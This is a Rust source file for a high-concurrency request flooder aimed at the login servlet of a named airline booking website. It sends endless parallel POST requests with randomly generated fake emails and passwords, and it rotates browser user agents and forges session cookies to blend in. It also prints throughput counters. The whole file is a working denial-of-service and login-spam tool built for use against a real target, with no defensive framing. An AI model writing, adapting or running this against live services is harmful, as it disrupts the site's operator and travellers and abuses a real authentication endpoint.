use cpu_time::ProcessTime;
use futures::future::join_all;
use rand::prelude::*;
use reqwest::{
    header::{HeaderMap, HeaderName, HeaderValue, COOKIE, USER_AGENT},
    Client,
};
use serde_json::json;
use std::{error::Error, sync::Arc, time::Instant};
use tokio::{sync::Semaphore, time::Duration};

const HEADERS: [(HeaderName, &str); 6] = [
    (HeaderName::from_static("host"), "book-airinuit.crane.aero"),
    (HeaderName::from_static("accept"), "*/*"),
    (HeaderName::from_static("accept-language"), "en-US,en;q=0.9"),
    (
        HeaderName::from_static("content-type"),
        "application/x-www-form-urlencoded",
    ),
    (
        HeaderName::from_static("origin"),
        "https://book-airinuit.crane.aero",
    ),
    (
        HeaderName::from_static("referer"),
        "https://book-airinuit.crane.aero/",
    ),
];

const USER_AGENTS: [&str; 3] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
];

const NAMES: [&str; 5] = ["james", "john", "robert", "michael", "william"];
const SURNAMES: [&str; 5] = ["smith", "johnson", "williams", "brown", "jones"];
const DOMAINS: [&str; 3] = ["gmail.com", "yahoo.com", "hotmail.com"];
const SPECIALS: [&str; 4] = ["!", "@", "#", "$"];

#[inline(always)]
fn generate_credentials() -> (String, String) {
    let mut rng = thread_rng();
    unsafe {
        (
            format!(
                "{}{}{:03}@{}",
                NAMES.get_unchecked(rng.gen_range(0..NAMES.len())),
                SURNAMES.get_unchecked(rng.gen_range(0..SURNAMES.len())),
                rng.gen_range(100..999),
                DOMAINS.get_unchecked(rng.gen_range(0..DOMAINS.len()))
            ),
            format!(
                "Pass{:04}{}",
                rng.gen_range(1000..9999),
                SPECIALS.get_unchecked(rng.gen_range(0..SPECIALS.len()))
            ),
        )
    }
}

#[inline(always)]
async fn make_request(
    client: &Client,
    base_headers: &HeaderMap,
) -> Result<(), Box<dyn Error + Send + Sync>> {
    let mut headers = base_headers.clone();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static(unsafe {
            USER_AGENTS.get_unchecked(thread_rng().gen_range(0..USER_AGENTS.len()))
        }),
    );
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&format!(
            "JSESSIONID={}",
            hex::encode(rand::random::<[u8; 8]>())
        ))?,
    );

    let (username, password) = generate_credentials();
    let form_data = json!({
        "USERNAME": username,
        "PASSWORD": password,
        "ORACLE_DEBUG_MODE": "",
        "paxInfo": "",
        "clickedButton": "",
        "": "Login.jsp?activeLanguage=EN",
        "FORGET_USERNAME": "",
        "FORGET_EMAIL": ""
    });

    client
        .post("https://book-airinuit.crane.aero/LoginServlet")
        .headers(headers)
        .form(&form_data)
        .timeout(Duration::from_secs(2))
        .send()
        .await?;

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let mut base_headers = HeaderMap::with_capacity(8);
    for (key, value) in &HEADERS {
        base_headers.insert(key, HeaderValue::from_static(value));
    }

    let client = Arc::new(
        Client::builder()
            .pool_max_idle_per_host(5000)
            .pool_idle_timeout(None)
            .tcp_keepalive(Duration::from_secs(10))
            .tcp_nodelay(true)
            .timeout(Duration::from_secs(3))
            .connect_timeout(Duration::from_secs(2))
            .http2_keep_alive_interval(Duration::from_secs(3))
            .http2_keep_alive_timeout(Duration::from_secs(5))
            .build()?,
    );

    let concurrent_requests = num_cpus::get() * 400;
    let semaphore = Arc::new(Semaphore::new(concurrent_requests));
    let mut total_success = 0;
    let mut total_errors = 0;

    println!(
        "Starting maximum performance mode with {} concurrent requests",
        concurrent_requests
    );

    loop {
        let start = Instant::now();
        let cpu_start = ProcessTime::now();

        let mut handles = Vec::with_capacity(concurrent_requests * 8);
        for _ in 0..concurrent_requests * 8 {
            let client = client.clone();
            let semaphore = semaphore.clone();
            let base_headers = base_headers.clone();
            handles.push(tokio::spawn(async move {
                let _permit = semaphore.acquire().await.unwrap();
                make_request(&client, &base_headers).await.is_ok()
            }));
        }

        let results = join_all(handles).await;
        let (success, errors): (Vec<_>, Vec<_>) =
            results.into_iter().filter_map(|r| r.ok()).partition(|&r| r);

        total_success += success.len();
        total_errors += errors.len();

        let elapsed = start.elapsed().as_secs_f64();
        let throughput = success.len() as f64 / elapsed;
        let cpu_usage =
            (cpu_start.elapsed().as_secs_f64() / elapsed / num_cpus::get() as f64) * 100.0;

        println!(
            "Throughput: {:.2} req/s | CPU: {:.1}% | Total Success/Error: {}/{}",
            throughput, cpu_usage, total_success, total_errors
        );
    }
}
